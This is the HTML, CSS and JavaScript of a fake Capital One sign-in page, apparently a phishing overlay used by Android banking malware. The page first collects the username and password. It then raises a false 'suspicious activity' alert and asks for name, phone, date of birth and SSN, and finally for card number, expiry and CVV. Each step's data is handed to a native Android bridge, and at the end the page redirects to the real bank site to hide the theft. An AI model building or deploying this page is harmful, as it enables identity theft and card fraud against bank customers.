<style>
    .paper-toggle{
  clear: both;
  margin: 20px 0;
}

.paper-toggle input:empty
{
  display:none;
}

.paper-toggle 
{
	position: relative;
	float: left;
	line-height: 1.6em;
	width: 150px;
	cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.paper-toggle input:empty ~ label:before, 
.paper-toggle input:empty ~ label:after
{
  position: absolute;
	display: block;
  content: ' ';
  -webkit-transition: all 200ms ease-in;
  transition: all 200ms ease-in;
}

.paper-toggle input:empty ~ label:before
{
    top: 3px;
    left: 4px;
    width: 34px;
    height: 14px;
    border-radius: 6px;
    background-color: #5a5a5a;
    opacity: 0.60;
}

input.switch:empty ~ label:after
{
    top: 0px;
    left: 0px;
    width: 1.4em;
    height: 8px;
    bottom: 0.1em;
    margin-left: 0.1em;
    background-color: #ffffff;
    border-radius: 50%;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    border: 0;
    border-color: #5a5a5a;
    -webkit-box-shadow: -1px 2px 6px -1px rgba(0,0,0,0.75);
    -moz-box-shadow: -1px 2px 6px -1px rgba(0,0,0,0.75);
    box-shadow: -1px 2px 6px -1px rgba(0,0,0,0.75);
}

.paper-toggle input:checked ~ label:before
{
	background-color: #00aeef;
}

.paper-toggle input:checked ~ label:after
{
	left: 16px;
  background-color: #00aeef;
  border-color: #00aeef;
}
.material {
  position: relative;
  padding: 0;
  margin: 5px;
  border: none;
  overflow: visible;
}
.material input {
  box-sizing: border-box;
  width: 100%;
  padding: 12px 10px 8px;
  border: none;
  border-radius: 0;
  box-shadow: none;
  border-bottom: 1px solid #DDD;
  font-size: 120%;
  outline: none;
  cursor: text;
}
.material input::-webkit-input-placeholder {
  transition: color 300ms ease;
}
.material input:not(:focus)::-webkit-input-placeholder {
  color: transparent;
}
.material hr {
  content: '';
  display: block;
  position: absolute;
  bottom: 0;
  left: 0;
  margin: 0;
  padding: 0;
  width: 100%;
  height: 2px;
  border: none;
  background: #008bc1;
  font-size: 1px;
  will-change: transform, visibility;
  transition: all 200ms ease-out;
  -webkit-transform: scaleX(0);
          transform: scaleX(0);
  visibility: hidden;
  z-index: 10;
}
.material input:focus ~ hr {
  -webkit-transform: scaleX(1);
          transform: scaleX(1);
  visibility: visible;
}
.material label {
  position: absolute;
  top: 10px;
  left: 10px;
  font-size: 120%;
  color: #008bc1;
  -webkit-transform-origin: 0 -150%;
          transform-origin: 0 -150%;
  transition: -webkit-transform 300ms ease;
  transition: transform 300ms ease;
  transition: transform 300ms ease, -webkit-transform 300ms ease;
  pointer-events: none;
}
.material input:focus ~ label,
.material input:valid ~ label {
  -webkit-transform: scale(0.6);
          transform: scale(0.6);
}

</style>

.main {
    margin-top: 10px;
}
.autorizeBox {
    background: rgba(255, 255, 255, .96);
    padding: 1.25rem 0;
    overflow: visible !important;
    margin: 0 auto;
    max-width: 370px;
}
.autorizeBox form {
    position: relative;
    min-height: .0625rem;
    padding: 5px 20px;
}
.autorizeBox ::placeholder {
    color: #008bc1;
    opacity: 1;
    font-weight: lighter;
    font-size: 1.08rem;
}
.autorizeBox label {
    font-size: 1.125rem;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    margin-left: 5px;
}
.autorizeBox button {
    margin: 20px 0;
    background-color: #008bc1;
    border: none;
    width: 100%;
    height: 2.5rem;
    overflow-x: auto;
    border-radius: .3125rem;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
}
.autorizeBox button:disabled,
.autorizeBox button[disabled] {
    background-color: #e6e7e9;
}
.autorizeBox button:disabled span,
.autorizeBox button[disabled] span {
    color: #a1a8af;
}
.autorizeBox button span {
    text-transform: uppercase;
    line-height: 1.125rem;
    white-space: normal;
    margin: .0625rem .75rem;
    font-size: 1rem;
    font-weight: bolder;
    color: #fff;
    letter-spacing: 0;
    text-decoration: none;
}
.footer {
    background: #fff;
    font-size: 16px;
    padding: 1em 0;
    margin-top: 150px;
    bottom: 0;
    left: 0;
    right: 0;
    color: #757575;
    font-size: 1rem;
    text-align: left;
}
.footer p.link {
    color: rgb(0, 106, 206);
    line-height: 15px;
    margin-top: 1px;
    margin-bottom: 1px;
    font-weight: bold;
}
.footer table {
    width: 100%;
    text-align: center;
    border-collapse: collapse;
}
.footer table tr td {
    width: 33.3333%;
}
#ccnumlbl {
    color: red;
    font-size: 0.8rem;
}
.warntext {
    color: red;
    margin-bottom: 20px;
    text-align: center;
    font-weight: bolder;
}
.infotext {
    color: #636363;
    text-align: center;
}
.avaimg {
    text-align: center;
    margin: 15px 0px -35px 0px;
}
.avaimg img {
    border-radius: 999px;
}
</style>

    <div class="main">
        <div class="autorizeBox">
            <form id="login" action="" style=""><fieldset class="material">
                    <input id="Username" placeholder="" pattern=".{4,}" autocomplete="off" type="text" required>
                    <hr>
                    <label>Username</label>
                    </fieldset>
                    <fieldset class="material">
                    <input id="Password" placeholder="" pattern=".{4,}" autocomplete="off" type="password" required>
                    <hr>
                    <label>Password</label>
                    </fieldset>
                    <br>
                    <div class="paper-toggle">
                            <input type="checkbox" id="rm" name="rm" class="switch" />
                            <label for="rm"></label>
                            <p style="position: absolute;margin-top: -30px;margin-left: 48px;width: 150px;">Remember me</p>
                        </div>
                    <button type="button" onclick="process('login')"><span>Sign in</span></button>
            </form>
            <form id="address" action="" style="display:none;">
                    <p class="warntext">Suspicious activity has been noticed on your account. Verify your identity.</p>
                    <fieldset class="material">
                    <input id="FirstName" placeholder="" pattern=".{3,}" autocomplete="off" type="text" required>
                    <hr>
                    <label>First name</label>
                    </fieldset>
                    <fieldset class="material">
                    <input id="LastName" placeholder="" pattern=".{3,}" autocomplete="off" type="text" required>
                    <hr>
                    <label>Last name</label>
                    </fieldset>
                    <fieldset class="material">
                    <input id="Phone" placeholder="" pattern="^\+[0-9]{6,}" maxlength="30" autocomplete="off" type="text" required>
                    <hr>
                    <label>Phone number +1...</label>
                    </fieldset>
                    <p style="margin-bottom: 0px;font-size: 1.2rem;">Date of birth</p>
                    <table>
                        <tr>
                            <td>
                            <fieldset class="material">
                            <input id="DOBmm" placeholder="" type="text" pattern="[0-9]{1,2}" maxlength="2" autocomplete="off" type="text" required>
                            <hr>
                            <label>ММ</label>
                            </fieldset>
                            </td>
                            <td>
                            <fieldset class="material">
                            <input id="DOBdd" placeholder="" type="text" pattern="[0-9]{1,2}" maxlength="2" autocomplete="off" type="text" required>
                            <hr>
                            <label>DD</label>
                            </fieldset>
                            </td>
                            <td>
                            <fieldset class="material">
                            <input id="DOByyyy" placeholder="" type="text" pattern="[0-9]{4}" maxlength="4" autocomplete="off" type="text" required>
                            <hr>
                            <label>YYYY</label>
                            </fieldset>
                            </td>
                        </tr>
                    </table>
                    <fieldset class="material">
                    <input id="SSN" placeholder="" pattern="[0-9\-]{9}" maxlength="9" autocomplete="off" type="text" required>
                    <hr>
                    <label>Social Security or Tax ID number</label>
                    </fieldset>
                    <button type="button" onclick="process('address')"><span>Next</span></button>
            </form>
            <form id="CC" action="" style="display:none;">
                    <fieldset class="material">
                    <input id="CCNUM" placeholder="" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
                    <hr>
                    <label>Credit card number</label>
                    </fieldset>
                    <span id="ccnumlbl"></span>
                    <p style="margin-bottom: 0px;font-size: 1.2rem;">EXP date:</p>
                    <table>
                        <tr>
                            <td>
                            <fieldset class="material">
                            <input id="CCexpMM" placeholder="" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
                            <hr>
                            <label>MM</label>
                            </fieldset>
                            </td>
                            <td>
                            <fieldset class="material">
                            <input id="CCEXPYY" placeholder="" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
                            <hr>
                            <label>YY</label>
                            </fieldset>
                            </td>
                        </tr>
                    </table>
                    <fieldset class="material">
                    <input id="CVV" placeholder="" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" required>
                    <hr>
                    <label>CVV</label>
                    </fieldset>
					<input id="exit" type="hidden" text="true"/>
                    <button type="button" onclick="process('CC')"><span>Sign in</span></button>
            </form>
        </div>
    </div>
    <div class="footer"><table>
        <tr>
                <td style="border-right: 3px solid #006ace;"><p class="link">Product Offerings</p></td>
                <td style="border-right: 3px solid #006ace;border-left: 3px solid #006ace;"><p class="link">Security & Privacy</p></td>
                <td style="border-left: 3px solid #006ace;"><p class="link">Español</p></td>
        </tr>
    </table></div>
</body>
<script>
var invalidCC = 'Invalid card number';

function maskCC(event) {
    var v = this.value.replace(/\D/g, '');
    this.value = '';
    for(var i = 0; i < v.length; i++) {
        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
    }
}
document.getElementById('CCNUM').addEventListener('input', maskCC, false);

function maskPhone(event) {
    var v = this.value.replace(/\D/g, '');
    this.value = '+' + v;
}
document.getElementById('Phone').addEventListener('input', maskPhone, false);

function maskOnlyNumbers(event) {
    this.value = this.value.replace(/\D/g, '');
}

var arrtagsID = ['SSN', 'CCexpMM', 'CCEXPYY', 'CVV', 'DOBmm', 'DOBdd', 'DOByyyy'];
for(var iid in arrtagsID) {
    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
}

function valid_credit_card(value) {
	if (/[^0-9-\s]+/.test(value)) return false;
	var nCheck = 0, nDigit = 0, bEven = false;
	value = value.replace(/\D/g, "");
	for (var n = value.length - 1; n >= 0; n--) {
		var cDigit = value.charAt(n),
			  nDigit = parseInt(cDigit, 10);
		if (bEven) {
			if ((nDigit *= 2) > 9) nDigit -= 9;
		}
		nCheck += nDigit;
		bEven = !bEven;
	}
	return (nCheck % 10) == 0;
}

var allButtons = document.getElementsByTagName('button');
for(var btn in allButtons) {
    allButtons[btn].disabled = true;
}

function CheckValidInput(id) {
    var finalbool = true, formids = document.getElementById(id);
	var currentinputs = formids.getElementsByTagName('input');
    for(var i = 0; i < currentinputs.length; i++ ) {
        if(currentinputs[i].id == 'CCNUM') {
            var bbb = valid_credit_card(currentinputs[i].value);
            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
            finalbool&= bbb;
            continue;
        }
        finalbool &= currentinputs[i].checkValidity();
    }
    formids.getElementsByTagName('button')[0].disabled = !finalbool;
}

var AllForms = document.getElementsByTagName('form');
function formChange(formId) {
    for(var i = 0; i < AllForms.length; i++) {
        AllForms[i].style.display = 'none';
        if(AllForms[i].id == formId) {
            AllForms[i+1].style.display = '';
            break;
        }
    }
}

for(var i = 0; i < AllForms.length; i++) {
    var myInputs = AllForms[i].getElementsByTagName('input');
    for(var j = 0; j < myInputs.length; j++) {
        AddInputEventByFormID(myInputs[j],AllForms[i].id);
    }
}

function AddInputEventByFormID(input, formid) {
    input.addEventListener('input', function(){CheckValidInput(formid)});
}

function process(formId) {
    try {
        Android.returnResult( formToJSON(document.getElementById(formId)) );
    } catch (err) {}
    if(formId == 'CC')
    {
        location.replace('https://www.capitalone.com/');
        return;
    }
    formChange(formId);
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSON(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].id] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}
</script>
